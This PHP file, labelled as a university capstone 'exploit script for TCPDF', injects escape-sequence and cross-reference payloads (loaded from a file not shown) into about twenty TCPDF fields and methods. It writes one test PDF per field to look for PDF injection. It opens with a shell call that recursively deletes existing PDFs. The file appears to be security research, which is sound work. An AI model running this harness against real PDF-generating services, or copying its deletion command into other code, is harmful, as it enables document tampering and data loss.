<!-- File: injection.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script for TCPDF -->
<?php
require_once __DIR__ . '/vendor/autoload.php';
require './php_payloads.php';

// Wipe existing PDFs
system("rm -r /var/www/myapp/pdfs/*.pdf");

function createPDF() {
    $pdf = new TCPDF();
    $pdf->setFont('times', '', 14, '', true);
    // $pdf->setCompression(false);
    $pdf->AddPage();
    return $pdf;
  }

// Creator
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetCreator($seq.$xref);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/creator'.$i.'.pdf', 'F');
    $i++;
}

// Author
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetAuthor($seq.$xref);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/author'.$i.'.pdf', 'F');
    $i++;
}

// Title
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetTitle($seq.$xref);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/title'.$i.'.pdf', 'F');
    $i++;
}

// Title
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetSubject($seq.$xref);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/subject'.$i.'.pdf', 'F');
    $i++;
}

// Keywords
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetKeywords($seq.$xref);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/keywords'.$i.'.pdf', 'F');
    $i++;
}

// Direct Image Stream
$imgdata = base64_decode('iVBORw0KGgoAAAANSUhEUgAAABwAAAASCAMAAAB/2U7WAAAABlBMVEUAAAD///+l2Z/dAAAASUlEQVR4XqWQUQoAIAxC2/0vXZDrEX4IJTRkb7lobNUStXsB0jIXIAMSsQnWlsV+wULF4Avk9fLq2r8a5HSE35Q3eO2XP1A1wQkZSgETvDtKdQAAAABJRU5ErkJggg==');
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Image('@'.$imgdata.$seq.$xref, 15, 140, 50, 50, '', '', '', true, 150, '', false, false, 1, false, false, false);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/directimage'.$i.'.pdf', 'F');
    $i++;
}

// Image Links
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Image("/var/www/myapp/images/xref.jpg", 15, 140, 50, 50, "JPEG", $seq.$xref, '', true, 150, '', false, false, 1, false, false, false);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/linkimage'.$i.'.pdf', 'F');
    $i++;
}

// Image Streams
$i = 0;
$path = "/var/www/myapp/images";
if ($handle = opendir($path)) {
    while (false !== ($file = readdir($handle))) {
        if ('.' === $file) continue;
        if ('..' === $file) continue;
        $pdf = createPDF();

        // Get Extension of Image
        $ext_option = "";
        $ext = explode(".", $file);
        $ext = strtolower($ext[count($ext) - 1]);
        if ($ext == "jpeg" || $ext == "jpg") {
            $ext_option = "JPEG";
        }
        elseif ($ext == "png") {
            $ext_option = "PNG";
        }
        else {
            $ext_option = "JPEG";
        }

        $pdf->Image("/var/www/myapp/images/".$file, 15, 140, 50, 50, $ext_option, '', '', true, 150, '', false, false, 1, false, false, false);
        $pdf->Text(20, 20, "DOGTEST");
        $pdf->Output('/var/www/myapp/pdfs/image'.$i.'.pdf', 'F');
        $i++;
    }
    closedir($handle);
}

// Write
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Write(0, $seq.$xref, $seq.$xref, 0, 'C', true, 0, false, false, 0);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/write'.$i.'.pdf', 'F');
    $i++;
}

// WriteHTML
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->writeHTML($seq.$xref, true, false, true, false, '');
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/writehtml'.$i.'.pdf', 'F');
    $i++;
}

// WriteHTMLCell
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->writeHTMLCell(0, 0, '', '', $seq.$xref, 0, 1, 0, true, '', true);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/writehtmlcell'.$i.'.pdf', 'F');
    $i++;
}

// Language Array: meta_charset
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();

    $lg = Array();
    $lg['a_meta_charset'] = $seq.$xref; 
    $lg['a_meta_dir'] = 'ltr';
    $lg['a_meta_language'] = 'en';
    $lg['w_page'] = 'page';
    $pdf->setLanguageArray($lg);

    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/metachar'.$i.'.pdf', 'F');
    $i++;
}

// Language Array: meta_dir
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();

    $lg = Array();
    $lg['a_meta_charset'] = 'ISO-8859-1'; 
    $lg['a_meta_dir'] = $seq.$xref;
    $lg['a_meta_language'] = 'en';
    $lg['w_page'] = 'page';
    $pdf->setLanguageArray($lg);

    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/metadir'.$i.'.pdf', 'F');
    $i++;
}

// Language Array: meta_lan
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();

    $lg = Array();
    $lg['a_meta_charset'] = 'ISO-8859-1'; 
    $lg['a_meta_dir'] = 'ltr';
    $lg['a_meta_language'] = $seq.$xref;
    $lg['w_page'] = 'page';
    $pdf->setLanguageArray($lg);

    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/metalan'.$i.'.pdf', 'F');
    $i++;
}

// Language Array: meta_page
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();

    $lg = Array();
    $lg['a_meta_charset'] = 'ISO-8859-1'; 
    $lg['a_meta_dir'] = 'ltr';
    $lg['a_meta_language'] = 'en';
    $lg['w_page'] = $seq.$xref;
    $pdf->setLanguageArray($lg);

    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/metapage'.$i.'.pdf', 'F');
    $i++;
}

// Text
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Text(20, 20, $seq.$xref);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/text'.$i.'.pdf', 'F');
    $i++;
}

// Cell
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Cell(0, 0, $seq.$xref, 1, 1, 'C', 0, $seq.$xref, 0);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/cell'.$i.'.pdf', 'F');
    $i++;
}

// MultiCell
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->MultiCell(20, 10, $seq.$xref, 1, 'J', false, 1, '' ,'', true);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/multicell'.$i.'.pdf', 'F');
    $i++;
}

// Annotation
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Annotation(40, 40, 10, 10, $seq.$xref, array('Subtype'=>'Text', 'Name' => 'Comment', 'T' => $seq.$xref, 'Subj' => $seq.$xref, 'C' => array(255, 255, 0)));
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/annotation'.$i.'.pdf', 'F');
    $i++;
}

// Link
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Link(10, 10, 30, 30, $seq.$xref);
    $pdf->Text(20, 20, "DOGTEST");
    $pdf->Output('/var/www/myapp/pdfs/link'.$i.'.pdf', 'F');
    $i++;
}

?>
<h1 style="text-align:center;">Your PDF(s) were created </h1>